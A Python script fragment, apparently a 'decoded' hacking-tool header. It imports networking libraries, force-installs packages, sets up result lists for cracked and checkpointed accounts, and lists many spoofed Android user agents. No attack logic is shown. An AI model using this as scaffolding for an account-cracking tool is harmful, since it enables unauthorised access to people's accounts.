#Decode_By_MrDevilEx
import re
import os
import sys
import time
import string
import random
import datetime
import base64
import marshal
import hashlib
import json
import py_compile
import platform
import subprocess
import typing


# FORCE TO IMPORT
try:
    import requests
    import bs4
    import colorama
    import pyfiglet
    import psutil
except Exception as error:
    print(error)
    os.system("pip install requests colorama bs4 pyfiglet psutil")
finally:
    import requests
    import bs4
    import colorama
    import psutil
    import pyfiglet

from typing import Final
from colorama import Fore
from bs4 import BeautifulSoup
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor



# colors 
RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
BLUE = Fore.BLUE
WHITE = Fore.WHITE
BLACK = Fore.BLACK
MAGENTA = Fore.MAGENTA
CYAN =  Fore.CYAN


# Variables.........
loop = 0
ok = []
cp = []
twf = []
user = []
pwx = []


ugen = [
'Mozilla/5.0 (Linux; Android 13; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
